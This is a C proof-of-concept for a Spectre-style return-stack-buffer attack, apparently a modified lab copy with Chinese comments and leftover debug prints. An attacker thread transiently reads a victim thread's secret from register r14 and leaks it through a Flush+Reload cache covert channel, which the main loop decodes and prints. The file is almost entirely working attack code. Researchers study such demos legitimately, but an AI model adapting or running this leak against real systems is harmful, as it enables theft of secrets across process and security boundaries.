#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include "cacheutils.h"

// Sleep for an predetermined amount of time specified in register r14 根据寄存器 r14 中的预定时间暂停执行
void __attribute__((noinline)) in_place()
{
  size_t time = 0;
  //使用内联汇编将寄存器 r14 的值移动到变量 time 中
  __asm__ volatile("movq %%r14, %0\n\t"
                   : "=r"(time));

  usleep(time);
  return;
}

void *__attribute__((noinline)) attacker()
{
  // Attacker is going to sleep for 65
  __asm__ volatile("movq $65, %r14\t\n"); // 65 is 'A'

  while (1)
  {
    // Put to sleep
    // As victim will sometimes wake up before the attacker, it will return here
    in_place();
    size_t secret = 0;
    // Retrieve secret data from register r14
    __asm__ volatile("movq %%r14, %0\n\t"
                     : "=r"(secret));

    // Encode data in covert channel
    cache_encode(secret);
  }
}

void *__attribute__((noinline)) victim()
{
  // Victim is going to sleep for 83
  //使用内联汇编将立即数 83 移动到寄存器 r14
  asm("movq $83, %r14\n\t"); // 83 is 'S'
  while (1)
  {
    // Call function and return here after misspeculation is detected
    in_place();
  }
}

int main(int argc, char **argv)
{
  pagesize = sysconf(_SC_PAGESIZE);
  // Detect cache threshold
  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  char *_mem = malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize - 1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  // Create two interleaving threads
  pthread_t attacker_thread;
  pthread_t victim_thread;
  pthread_create(&attacker_thread, 0, attacker, 0);
  pthread_create(&victim_thread, 0, victim, 0);

  int times = 10000;
  printf("111\n");
  while (times-- >= 0)
  {
    // Flush our shared memory
    flush_shared_memory();

    mfence();
    //nospec();

    // Recover data from covert channel
    for (int i = 0; i < 256; i++)
    {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      printf("wai%d\n",mix_i);
      if (flush_reload(mem + mix_i * pagesize))
      {printf("%d\n",mix_i);
        if(1)
        //if (mix_i > 'A' && mix_i <= 'Z')
        {
          printf("\x1b[33m%c\x1b[0m ", mix_i);
          break;
        }
        fflush(stdout);
        sched_yield();
      }
    }
  }
  printf("222\n");
}
